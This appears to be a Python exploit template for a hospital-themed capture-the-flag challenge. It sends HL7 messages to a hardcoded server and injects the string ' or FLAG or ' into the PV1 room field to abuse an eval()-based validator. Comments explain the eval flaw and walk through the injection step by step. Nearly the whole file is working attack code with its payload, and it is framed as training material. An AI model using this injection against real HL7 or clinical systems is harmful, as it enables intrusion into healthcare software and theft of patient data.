#!/usr/bin/env python3
"""
HL7 Message Sender - Exploit Template
Modify this to exploit the vulnerable HL7 handler

SaintCon Hospital CTF - Challenge 16: The HL7 Exploit
Target: Elizabeth Hartwell (MRN: VIP-7741, Room 311)
"""

import socket

def send_hl7_message(host, port, message):
    """Send HL7 message to server"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            s.connect((host, port))
            s.sendall(message.encode())
            
            response = s.recv(4096)
            print(f"Server response:\n{response.decode()}\n")
            
    except Exception as e:
        print(f"Error: {e}")

# Sample valid message for Elizabeth Hartwell
# Note: HL7 uses \r (carriage return) as segment separator
valid_message = "MSH|^~\\&|HIS|SAINTCON|LAB|SAINTCON|20251021143000||ADT^A01|MSG00001|P|2.5\r"
valid_message += "PID|1||VIP-7741||HARTWELL^ELIZABETH||19620315|F\r"
valid_message += "PV1|1|I|311^A^01"

# TODO: Modify the PV1 segment room field to exploit the handler
# 
# VULNERABILITY ANALYSIS:
# The server uses eval() to validate room numbers unsafely:
#     eval(f"'{room}' in {valid_rooms} or '{room}'")
# 
# EXPLOITATION STEPS:
# 1. The room field (311) is inserted into the eval string
# 2. You can break out of the string context using quotes
# 3. The FLAG variable is available in the eval() scope
# 4. Inject code to make eval() return the FLAG value
#
# HINTS:
# - Current eval with room "311": eval("'311' in [...] or '311'")
# - What if room was: ' or FLAG or '
# - That would create: eval("'' or FLAG or '' in [...] or ''")
# - The eval would return the FLAG value!
#
# TASK: Replace "311" below with your exploit payload

exploit_message = "MSH|^~\\&|HIS|SAINTCON|LAB|SAINTCON|20251021143000||ADT^A01|MSG00001|P|2.5\r"
exploit_message += "PID|1||VIP-7741||HARTWELL^ELIZABETH||19620315|F\r"
exploit_message += "PV1|1|I|' or FLAG or '^A^01"

if __name__ == "__main__":
    TARGET_HOST = "172.184.215.224"  # SaintCon CTF HL7 Server
    TARGET_PORT = 2575
    
    print("="*70)
    print("SaintCon Hospital - HL7 Exploit Tool")
    print("="*70)
    
    print("\n[*] Testing connection with valid message...")
    send_hl7_message(TARGET_HOST, TARGET_PORT, valid_message)
    
    print("="*70)
    print("[*] Sending exploit attempt...")
    print("="*70)
    send_hl7_message(TARGET_HOST, TARGET_PORT, exploit_message)
    
    print("\n[*] Look for 'EVAL_RESULT:' in the response above")
    print("[*] If you see CTF{...}, you've successfully extracted the flag!")